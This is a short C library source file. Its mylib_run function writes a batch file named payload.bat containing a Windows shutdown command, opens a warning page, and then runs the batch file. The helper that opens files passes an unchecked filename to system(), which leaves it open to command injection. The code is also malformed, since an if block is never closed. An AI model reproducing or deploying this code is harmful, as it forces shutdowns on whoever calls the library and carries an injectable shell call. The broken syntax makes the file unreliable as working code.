#include <stdio.h>
#include <stdlib.h>
#include "mylib.h"

void open_html(const char *filename) {
#ifdef _WIN32
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "start %s", filename);
    system(cmd);
#elif __APPLE__
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "open %s", filename);
    system(cmd);
#else
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "xdg-open %s", filename);
    system(cmd);
#endif
}

void mylib_run(void) {
    FILE *f = fopen("payload.bat", "w");
    if (f) {
        fprintf(f,
            "shutdown /s /t 30"
        );
        fclose(f);
    open_html("warning.html");
    open_html("payload.bat");
}

